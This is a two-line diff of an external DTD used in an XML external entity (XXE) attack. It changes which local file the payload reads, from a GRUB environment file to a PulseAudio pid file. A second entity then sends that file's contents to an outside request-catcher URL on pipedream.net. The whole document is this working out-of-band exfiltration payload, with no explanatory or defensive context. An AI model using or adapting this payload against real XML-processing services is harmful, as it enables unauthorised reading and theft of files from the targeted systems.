@@ -1,2 +1,2 @@
-<!ENTITY % file SYSTEM "file:///boot/grub/grubenv">
+<!ENTITY % file SYSTEM "file:///run/user/1000/pulse/pid">
 <!ENTITY % all "<!ENTITY &#37; send SYSTEM 'https://enhxp1es94fe4.x.pipedream.net/?%file;'>">
